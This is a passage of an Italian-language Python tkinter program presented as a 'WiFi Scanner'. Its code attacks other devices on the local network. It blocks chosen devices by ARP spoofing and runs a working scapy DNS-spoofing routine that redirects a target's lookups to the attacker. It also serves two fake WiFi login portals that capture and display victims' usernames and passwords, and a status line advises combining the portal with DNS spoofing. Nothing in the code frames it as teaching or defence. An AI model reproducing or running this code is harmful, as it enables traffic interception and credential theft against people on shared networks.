        title_frame = tk.Frame(win, bg=BG); title_frame.pack(pady=2)
        tk.Label(title_frame, text="Titolo login:", font=("Courier New", 9),
                 bg=BG, fg=MUTED).pack(side="left", padx=(0,4))
        title_var = tk.StringVar(value="WiFi Gratuito — Accedi")
        title_entry = tk.Entry(title_frame, textvariable=title_var,
                               font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                               insertbackground=TEXT, relief="flat", bd=4, width=26)
        title_entry.pack(side="left")

        portal_active = [False]
        server_ref = [None]
        creds_list = []

        def get_login_html(title):
            return f"""<!DOCTYPE html>
<html><head><meta charset="utf-8">
<title>{title}</title>
<style>
body{{margin:0;background:#1a1a2e;display:flex;align-items:center;justify-content:center;height:100vh;font-family:sans-serif;}}
.box{{background:white;padding:40px;border-radius:16px;width:320px;text-align:center;box-shadow:0 8px 40px rgba(0,0,0,0.4);}}
h2{{color:#333;margin-bottom:24px;}}
input{{width:100%;padding:12px;margin:8px 0;border:1px solid #ddd;border-radius:8px;font-size:15px;box-sizing:border-box;}}
button{{width:100%;padding:14px;background:#4285f4;color:white;border:none;border-radius:8px;font-size:16px;cursor:pointer;margin-top:12px;}}
button:hover{{background:#3367d6;}}
p{{color:#888;font-size:12px;margin-top:16px;}}
</style></head>
<body><div class="box">
<h2>{title}</h2>
<form method="POST" action="/login">
<input name="email" type="text" placeholder="Email o utente" required/>
<input name="password" type="password" placeholder="Password" required/>
<button type="submit">Accedi</button>
</form>
<p>Inserisci le tue credenziali per accedere alla rete</p>
</div></body></html>"""

        def do_portal():
            if portal_active[0]:
                if server_ref[0]:
                    server_ref[0].shutdown()
                    server_ref[0] = None
                portal_active[0] = False
                portal_btn.configure(text="🌐  AVVIA PORTAL", fg=ACCENT)
                if creds_list:
                    status.configure(text=f"Fermato — {len(creds_list)} credenziali catturate!", fg=YELLOW)
                    # mostra credenziali
                    creds_win = tk.Toplevel(win)
                    creds_win.title("Credenziali catturate")
                    creds_win.configure(bg=BG)
                    creds_win.geometry("400x300")
                    tk.Label(creds_win, text="CREDENZIALI CATTURATE",
                             font=("Courier New", 11, "bold"), bg=BG, fg=GREEN).pack(pady=10)
                    txt = tk.Text(creds_win, font=("Courier New", 10), bg=SURFACE,
                                  fg=GREEN, relief="flat", padx=10, pady=10)
                    txt.pack(fill="both", expand=True, padx=10, pady=10)
                    for c in creds_list:
                        txt.insert("end", "Utente: " + c["email"] + "\nPassword: " + c["password"] + "\n---\n")
                else:
                    status.configure(text="Portal fermato — nessuna credenziale", fg=MUTED)
            else:
                creds_list.clear()
                tipo = tipo_var.get()
                url = portal_url_var.get().strip()
                title = title_var.get().strip()
                my_ip = self._get_local_ip()

                import threading, http.server, urllib.parse

                class Handler(http.server.BaseHTTPRequestHandler):
                    def do_GET(self):
                        if tipo == "redirect":
                            self.send_response(302)
                            self.send_header("Location", url)
                            self.end_headers()
                        else:
                            html = get_login_html(title).encode()
                            self.send_response(200)
                            self.send_header("Content-Type", "text/html; charset=utf-8")
                            self.send_header("Content-Length", str(len(html)))
                            self.end_headers()
                            self.wfile.write(html)

                    def do_POST(self):
                        length = int(self.headers.get("Content-Length", 0))
                        body = self.rfile.read(length).decode()
                        params = urllib.parse.parse_qs(body)
                        email = params.get("email", [""])[0]
                        password = params.get("password", [""])[0]
                        creds_list.append({"email": email, "password": password})
                        status.configure(text=f"Credenziale catturata: {email}", fg=GREEN)
                        # redirect dopo login
                        self.send_response(302)
                        self.send_header("Location", "https://www.google.com")
                        self.end_headers()

                    def log_message(self, *a): pass

                def run_server():
                    srv = http.server.HTTPServer(("0.0.0.0", 8080), Handler)
                    server_ref[0] = srv
                    srv.serve_forever()

                threading.Thread(target=run_server, daemon=True).start()

                # DNS spoofing — punta DNS del dispositivo al nostro IP
                # (funziona se il dispositivo usa DNS automatico e noi siamo gateway)
                portal_active[0] = True
                portal_btn.configure(text="⛔  FERMA PORTAL", fg=RED)
                status.configure(text=f"Portal attivo su {my_ip}:8080 — in attesa...", fg=GREEN)

        r2 = tk.Frame(win, bg=BG); r2.pack(pady=4)
        portal_btn = tk.Button(r2, text="🌐  AVVIA PORTAL",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=ACCENT, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_portal)
        portal_btn.pack(side="left")

        # ── POPUP WINDOWS ──
        tk.Label(win, text="POPUP WINDOWS", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))
        r3 = tk.Frame(win, bg=BG); r3.pack(pady=4)

        popup_msg = tk.Entry(r3, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                             insertbackground=TEXT, relief="flat", bd=4, width=28)
        popup_msg.insert(0, "Ciao!")
        popup_msg.pack(side="left", padx=(0,6))

        def do_popup():
            msg = popup_msg.get().strip()
            if not msg:
                status.configure(text="Scrivi un messaggio!", fg=RED)
                return
            try:
                subprocess.run(["net", "send", ip, msg], capture_output=True)
                # metodo alternativo via PowerShell remoto
                subprocess.run(["powershell", "-Command",
                    f'[System.Windows.MessageBox]::Show("{msg}")'],
                    capture_output=True)
                status.configure(text=f"Popup inviato a {ip}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r3, text="💬  INVIA POPUP",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_popup).pack(side="left")

        # ── CARTELLE CONDIVISE ──
        tk.Label(win, text="CARTELLE CONDIVISE WINDOWS", font=("Courier New", 8, "bold"),
                 bg=BG, fg=MUTED).pack(pady=(10,0))
        r4 = tk.Frame(win, bg=BG); r4.pack(pady=4)

        def do_smb():
            try:
                subprocess.Popen(["explorer", f"\\{ip}"])
                status.configure(text=f"Aperto explorer su {ip}!", fg=GREEN)
            except Exception as e:
                status.configure(text=f"Errore: {e}", fg=RED)

        tk.Button(r4, text="📁  APRI CARTELLE",
                  font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=14, pady=6,
                  cursor="hand2", command=do_smb).pack(side="left", padx=4)

        status.pack(pady=10)
        tk.Button(win, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=win.destroy).pack()

    def _toggle_block(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        item = sel[0]
        vals = list(self.tree.item(item)["values"])
        ip   = vals[0]
        tags = self.tree.item(item)["tags"]
        tag  = tags[0] if tags else ""
        if tag == "self":
            messagebox.showwarning("Attenzione", "Non puoi bloccare il tuo stesso PC!")
            return
        if ip in blocked_threads:
            blocked_threads[ip]["stop"].set()
            blocked_threads.pop(ip, None)
            vals[3] = "online"; vals[4] = "—"
            self.tree.item(item, values=vals, tags=("online",))
            self.block_btn.configure(text="🔴  BLOCCA", fg=RED)
            self._set_status(f"Sbloccato: {ip}", GREEN)
        else:
            gw = get_gateway()
            if not gw:
                messagebox.showerror("Errore", "Impossibile rilevare il gateway.")
                return
            stop_event = threading.Event()
            t = threading.Thread(target=arp_spoof_loop, args=(ip, gw, stop_event), daemon=True)
            t.start()
            blocked_threads[ip] = {"stop": stop_event, "thread": t}
            vals[3] = "BLOCCATO"; vals[4] = "●"
            self.tree.item(item, values=vals, tags=("blocked",))
            self.block_btn.configure(text="🟢  SBLOCCA", fg=GREEN)
            self._set_status(f"Bloccato: {ip}", RED)

    def _get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return None

    def _get_subnet(self, ip):
        return ".".join(ip.split(".")[:3]) + ".0/24"

    def _arp_scan(self, subnet):
        devices = {}
        my_ip = self._get_local_ip()
        def ping(ip):
            subprocess.run(["ping", "-n", "1", "-w", "300", ip], capture_output=True)
        base = ".".join(subnet.split(".")[:3])
        threads = []
        for i in range(1, 255):
            t = threading.Thread(target=ping, args=(f"{base}.{i}",), daemon=True)
            t.start()
            threads.append(t)
        for t in threads:
            t.join()
        arp = subprocess.run(["arp", "-a"], capture_output=True, text=True)
        for line in arp.stdout.splitlines():
            m = re.search(r"(\d+\.\d+\.\d+\.\d+)\s+([\w-]{17})", line)
            if m:
                ip, mac = m.group(1), m.group(2).upper()
                if "FF-FF-FF-FF-FF-FF" in mac:
                    continue
                is_blocked = ip in blocked_threads
                tag = "blocked" if is_blocked else ("self" if ip == my_ip else "online")
                try:
                    hostname = socket.gethostbyaddr(ip)[0]
                except:
                    hostname = "—"
                devices[ip] = {"ip": ip, "hostname": hostname, "mac": mac,
                               "stato": "BLOCCATO" if is_blocked else "online",
                               "blocco": "●" if is_blocked else "—", "tag": tag}
        if my_ip and my_ip not in devices:
            try:
                hostname = socket.gethostname()
            except:
                hostname = "questo PC"
            devices[my_ip] = {"ip": my_ip, "hostname": hostname, "mac": "—",
                               "stato": "online", "blocco": "—", "tag": "self"}
        return list(devices.values())

    def _start_scan(self):
        self.scan_btn.configure(state="disabled")
        self.progress.start(10)
        self._set_status("scansione in corso...", YELLOW)
        for row in self.tree.get_children():
            self.tree.delete(row)
        threading.Thread(target=self._scan_thread, daemon=True).start()

    def _scan_thread(self):
        my_ip = self._get_local_ip()
        if not my_ip:
            self.after(0, lambda: self._scan_done([], error="Nessuna connessione rilevata"))
            return
        subnet = self._get_subnet(my_ip)
        self.after(0, lambda: self.subnet_lbl.configure(
            text=f"Rete locale: {subnet}  |  Il tuo IP: {my_ip}"))
        devices = self._arp_scan(subnet)
        self.devices = devices
        self.after(0, lambda: self._scan_done(devices))

    def _scan_done(self, devices, error=None):
        self.progress.stop()
        self.scan_btn.configure(state="normal")
        self.time_lbl.configure(text=f"Ultima scansione: {datetime.now().strftime('%H:%M:%S')}")
        if error:
            self._set_status(error, RED)
            return
        devices.sort(key=lambda d: list(map(int, d["ip"].split("."))))
        for d in devices:
            self.tree.insert("", "end",
                             values=(d["ip"], d["hostname"], d["mac"], d["stato"], d["blocco"]),
                             tags=(d["tag"],))
        n = len(devices)
        self.count_lbl.configure(text=f"{n} dispositiv{'o' if n==1 else 'i'} trovati")
        self._set_status("scansione completata", GREEN)

    def _set_status(self, text, color):
        self.status_lbl.configure(text=text, fg=color)
        self.status_dot.configure(fg=color)

    def _export(self):
        if not self.devices:
            messagebox.showinfo("Nessun dato", "Esegui prima una scansione.")
            return
        path = os.path.join(os.path.expanduser("~"), "Desktop", "wifi_scan.txt")
        with open(path, "w", encoding="utf-8") as f:
            f.write(f"WiFi Scanner — {datetime.now().strftime('%d/%m/%Y %H:%M:%S')}\n")
            f.write("=" * 60 + "\n\n")
            for d in self.devices:
                f.write(f"IP:       {d['ip']}\n")
                f.write(f"Hostname: {d['hostname']}\n")
                f.write(f"MAC:      {d['mac']}\n")
                f.write(f"Stato:    {d['stato']}\n")
                f.write("-" * 40 + "\n")
        messagebox.showinfo("Esportato", f"File salvato in:\n{path}")

    def _rete(self):
        sel = self.tree.selection()
        if not sel:
            messagebox.showinfo("Seleziona", "Clicca prima un dispositivo dalla lista.")
            return
        item = sel[0]
        vals = self.tree.item(item)["values"]
        ip  = vals[0]
        mac = vals[2]

        win = tk.Toplevel()
        win.title(f"RETE — {ip}")
        win.geometry("580x520")
        win.configure(bg=BG)
        win.resizable(False, False)

        canvas = tk.Canvas(win, bg=BG, highlightthickness=0)
        scrollbar = ttk.Scrollbar(win, orient="vertical", command=canvas.yview)
        sf = tk.Frame(canvas, bg=BG)
        sf.bind("<Configure>", lambda e: canvas.configure(scrollregion=canvas.bbox("all")))
        canvas.create_window((0,0), window=sf, anchor="nw")
        canvas.configure(yscrollcommand=scrollbar.set)
        canvas.pack(side="left", fill="both", expand=True)
        scrollbar.pack(side="right", fill="y")
        win.bind("<MouseWheel>", lambda e: canvas.yview_scroll(int(-1*(e.delta/120)), "units"))

        tk.Label(sf, text="RETE", font=("Courier New", 16, "bold"), bg=BG, fg=ACCENT).pack(pady=(16,2))
        tk.Label(sf, text=f"IP: {ip}  |  MAC: {mac}", font=("Courier New", 10), bg=BG, fg=MUTED).pack()
        tk.Frame(sf, bg=BORDER, height=1).pack(fill="x", padx=24, pady=10)

        status = tk.Label(sf, text="", font=("Courier New", 9), bg=BG, fg=MUTED)

        # ── WINDOWS ──
        tk.Label(sf, text="WINDOWS", font=("Courier New", 8, "bold"), bg=BG, fg=YELLOW).pack(pady=(4,0))
        tk.Label(sf, text="Funziona solo se il dispositivo è Windows", font=("Courier New", 8), bg=BG, fg=MUTED).pack()
        rw = tk.Frame(sf, bg=BG); rw.pack(pady=4)

        def smb_scan():
            import threading
            def _scan():
                status.configure(text="Scansione cartelle condivise...", fg=YELLOW)
                r = subprocess.run(["net", "view", f"\\{ip}"], capture_output=True, text=True, shell=True)
                out = r.stdout + r.stderr
                if out.strip():
                    status.configure(text=f"Cartelle: {out[:100]}", fg=GREEN)
                else:
                    status.configure(text="Nessuna cartella condivisa trovata", fg=MUTED)
            threading.Thread(target=_scan, daemon=True).start()

        def apri_smb():
            subprocess.Popen(f"explorer \\{ip}", shell=True)
            status.configure(text="Aperto Esplora risorse sulla condivisione", fg=GREEN)

        def wake_on_lan():
            if mac == "—":
                status.configure(text="MAC address non disponibile!", fg=RED)
                return
            mac_clean = mac.replace("-","").replace(":","")
            magic = bytes.fromhex("FF"*6 + mac_clean*16)
            import socket
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
            s.sendto(magic, ("<broadcast>", 9))
            s.close()
            status.configure(text=f"Pacchetto Wake on LAN inviato a {mac}!", fg=GREEN)

        def net_send():
            msg_win = tk.Toplevel(win)
            msg_win.title("Net Send")
            msg_win.geometry("360x160")
            msg_win.configure(bg=BG)
            msg_win.grab_set()
            tk.Label(msg_win, text="Messaggio popup Windows:", font=("Courier New", 9), bg=BG, fg=MUTED).pack(pady=(16,4))
            e = tk.Entry(msg_win, font=("Courier New", 10), bg=SURFACE, fg=TEXT,
                        insertbackground=TEXT, relief="flat", bd=4, width=30)
            e.pack()
            def send():
                msg = e.get().strip()
                if not msg: return
                subprocess.run(f'msg * /server:{ip} "{msg}"', shell=True, capture_output=True)
                status.configure(text="Messaggio inviato! (funziona se Messenger è attivo)", fg=GREEN)
                msg_win.destroy()
            tk.Button(msg_win, text="INVIA", font=("Courier New", 10, "bold"),
                     bg=GREEN, fg=BG, relief="flat", padx=16, pady=6,
                     cursor="hand2", command=send).pack(pady=10)

        tk.Button(rw, text="📂  SCAN SMB", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=smb_scan).pack(side="left", padx=4)
        tk.Button(rw, text="📁  APRI SHARE", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=YELLOW, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=apri_smb).pack(side="left", padx=4)
        tk.Button(rw, text="⚡  WAKE ON LAN", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=GREEN, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=wake_on_lan).pack(side="left", padx=4)
        tk.Button(rw, text="💬  NET SEND", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=net_send).pack(side="left", padx=4)

        # ── TUTTI I DISPOSITIVI ──
        tk.Frame(sf, bg=BORDER, height=1).pack(fill="x", padx=24, pady=(12,4))
        tk.Label(sf, text="TUTTI I DISPOSITIVI", font=("Courier New", 8, "bold"), bg=BG, fg=RED).pack(pady=(4,0))
        tk.Label(sf, text="Funziona su Android, iOS, Windows, Mac", font=("Courier New", 8), bg=BG, fg=MUTED).pack()
        ra = tk.Frame(sf, bg=BG); ra.pack(pady=4)

        def dns_spoof():
            try:
                from scapy.all import DNS, DNSQR, DNSRR, IP, UDP, sniff, send
            except ImportError:
                status.configure(text="Serve scapy installato: pip install scapy", fg=RED)
                return
            import threading
            my_ip = self._get_local_ip()
            stop = [False]

            def spoof(pkt):
                if stop[0]: return
                if pkt.haslayer(DNS) and pkt[DNS].qr == 0:
                    spoofed = IP(dst=pkt[IP].src, src=pkt[IP].dst) /                               UDP(dport=pkt[UDP].sport, sport=53) /                               DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd,
                                  an=DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata=my_ip))
                    send(spoofed, verbose=0)

            def _run():
                sniff(filter=f"host {ip} and udp port 53", prn=spoof, store=0, timeout=300)

            threading.Thread(target=_run, daemon=True).start()
            status.configure(text=f"DNS spoofing attivo su {ip} → tutte le richieste DNS vanno a {my_ip}", fg=RED)

        def captive_portal():
            import threading, http.server, urllib.parse
            my_ip = self._get_local_ip()

            html = """<!DOCTYPE html>
<html><head><meta charset='utf-8'><title>Connessione WiFi</title>
<style>body{background:#111;display:flex;align-items:center;justify-content:center;
height:100vh;margin:0;font-family:sans-serif;}
.box{background:#222;color:white;padding:40px;border-radius:16px;text-align:center;width:320px;}
h2{color:#58a6ff;}input{width:100%;padding:10px;margin:8px 0;border-radius:8px;
border:none;background:#333;color:white;font-size:16px;}
button{width:100%;padding:12px;background:#58a6ff;color:#000;border:none;
border-radius:8px;font-size:16px;cursor:pointer;font-weight:bold;margin-top:8px;}
</style></head><body><div class='box'>
<h2>🔒 Accesso WiFi</h2><p>Inserisci le credenziali per continuare</p>
<input type='text' placeholder='Username' id='u'>
<input type='password' placeholder='Password' id='p'>
<button onclick='sub()'>Connetti</button></div>
<script>function sub(){
fetch('/creds?u='+document.getElementById('u').value+'&p='+document.getElementById('p').value)
.then(()=>{document.querySelector('.box').innerHTML='<h2>✅ Connesso!</h2><p>Benvenuto</p>';})
}</script></body></html>"""

            credenziali = []

            class Handler(http.server.BaseHTTPRequestHandler):
                def log_message(self, *a): pass
                def do_GET(self):
                    if self.path.startswith("/creds"):
                        parsed = urllib.parse.urlparse(self.path)
                        params = urllib.parse.parse_qs(parsed.query)
                        u = params.get("u",[""])[0]
                        p = params.get("p",[""])[0]
                        credenziali.append({"user": u, "pass": p})
                        status.configure(text=f"CREDENZIALI: user={u} pass={p}", fg=RED)
                        self.send_response(200)
                        self.end_headers()
                        self.wfile.write(b"ok")
                    else:
                        self.send_response(200)
                        self.send_header("Content-type","text/html")
                        self.end_headers()
                        self.wfile.write(html.encode())

            server = http.server.HTTPServer(("0.0.0.0", 80), Handler)
            threading.Thread(target=server.serve_forever, daemon=True).start()
            status.configure(text=f"Captive portal attivo su http://{my_ip} — combina con DNS spoofing!", fg=RED)

        tk.Button(ra, text="🔀  DNS SPOOF", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=dns_spoof).pack(side="left", padx=4)
        tk.Button(ra, text="🪤  CAPTIVE PORTAL", font=("Courier New", 10, "bold"),
                  bg=SURFACE, fg=RED, relief="flat", padx=10, pady=6,
                  cursor="hand2", command=captive_portal).pack(side="left", padx=4)

        status.pack(pady=10)
        tk.Button(sf, text="Chiudi", font=("Courier New", 10),
                  bg=SURFACE, fg=MUTED, relief="flat", padx=12, pady=6,
                  cursor="hand2", command=win.destroy).pack(pady=(0,16))

    def on_close(self):
        for data in blocked_threads.values():
            data["stop"].set()
        self.destroy()

import hashlib
import json

PWD_FILE = os.path.join(os.path.expanduser("~"), ".wifiscanner_pwd")

def get_pwd_hash():
    try:
        with open(PWD_FILE, "r") as f:
            return json.load(f)["hash"]
    except:
        # password default 1234
        return hashlib.sha256("1234".encode()).hexdigest()

def save_pwd_hash(h):
    with open(PWD_FILE, "w") as f:
        json.dump({"hash": h}, f)

def hash_pwd(p):
    return hashlib.sha256(p.encode()).hexdigest()

def login():
    win = tk.Tk()
    win.title("WiFi Scanner — Accesso")
    win.geometry("360x280")
    win.configure(bg=BG)
    win.resizable(False, False)

    result = [False]

    tk.Label(win, text="WIFI SCANNER", font=("Courier New", 18, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(30, 4))
    tk.Label(win, text="Inserisci password",
             font=("Courier New", 10), bg=BG, fg=MUTED).pack()

    tk.Frame(win, bg=BORDER, height=1).pack(fill="x", padx=24, pady=12)

    pwd_entry = tk.Entry(win, font=("Courier New", 12), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=6,
                         show="●", width=20)
    pwd_entry.pack(pady=8)
    pwd_entry.focus()

    err_lbl = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=RED)
    err_lbl.pack()

    def do_login(e=None):
        if hash_pwd(pwd_entry.get()) == get_pwd_hash():
            result[0] = True
            win.destroy()
        else:
            err_lbl.configure(text="Password errata!")
            pwd_entry.delete(0, "end")

    pwd_entry.bind("<Return>", do_login)

    tk.Button(win, text="ACCEDI", font=("Courier New", 11, "bold"),
              bg=ACCENT, fg=BG, relief="flat", padx=20, pady=6,
              cursor="hand2", command=do_login).pack(pady=8)

    win.mainloop()
    return result[0]

def cambia_password_dialog():
    win = tk.Toplevel()
    win.title("Cambia Password")
    win.geometry("360x300")
    win.configure(bg=BG)
    win.resizable(False, False)
    win.grab_set()

    tk.Label(win, text="CAMBIA PASSWORD", font=("Courier New", 13, "bold"),
             bg=BG, fg=ACCENT).pack(pady=(20, 4))

    form = tk.Frame(win, bg=BG)
    form.pack(padx=24, fill="x", pady=8)

    tk.Label(form, text="Password attuale", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    old_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4, show="●")
    old_entry.pack(fill="x", pady=(0,8))

    tk.Label(form, text="Nuova password", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    new_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                         insertbackground=TEXT, relief="flat", bd=4, show="●")
    new_entry.pack(fill="x", pady=(0,8))

    tk.Label(form, text="Conferma nuova password", font=("Courier New", 9), bg=BG, fg=MUTED).pack(anchor="w")
    conf_entry = tk.Entry(form, font=("Courier New", 11), bg=SURFACE, fg=TEXT,
                          insertbackground=TEXT, relief="flat", bd=4, show="●")
    conf_entry.pack(fill="x")

    err_lbl = tk.Label(win, text="", font=("Courier New", 9), bg=BG, fg=RED)
    err_lbl.pack(pady=4)

    def do_cambia():
        if hash_pwd(old_entry.get()) != get_pwd_hash():
            err_lbl.configure(text="Password attuale errata!", fg=RED)
            return
        if new_entry.get() != conf_entry.get():
            err_lbl.configure(text="Le password non coincidono!", fg=RED)
            return
        if len(new_entry.get()) < 4:
            err_lbl.configure(text="Password troppo corta (min 4)!", fg=RED)
            return
        save_pwd_hash(hash_pwd(new_entry.get()))
        err_lbl.configure(text="Password cambiata!", fg=GREEN)
        win.after(1000, win.destroy)

    tk.Button(win, text="SALVA", font=("Courier New", 11, "bold"),
              bg=GREEN, fg=BG, relief="flat", padx=20, pady=6,
              cursor="hand2", command=do_cambia).pack()

if __name__ == "__main__":
    if not login():
        exit()
    app = WifiScanner()
    # aggiungi voce cambia password nel menu
    menubar = tk.Menu(app)
    settingsmenu = tk.Menu(menubar, tearoff=0)
    settingsmenu.add_command(label="Cambia password", command=cambia_password_dialog)
    menubar.add_cascade(label="Impostazioni", menu=settingsmenu)
    app.configure(menu=menubar)
    app.protocol("WM_DELETE_WINDOW", app.on_close)
    app.mainloop()
